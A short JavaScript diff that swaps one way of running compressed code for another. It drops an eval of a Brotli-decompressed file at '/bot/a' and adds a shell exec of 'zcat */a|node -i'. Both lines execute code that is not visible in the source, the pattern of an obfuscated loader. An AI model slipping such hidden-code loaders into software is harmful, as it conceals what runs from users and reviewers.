@@ -1,3 +1,2 @@
-eval(require('zlib')
-.brotliDecompressSync(
-(F=require('fs')).readFileSync('/bot/a'))+'')
+require('child_process')
+.exec('zcat */a|node -i')
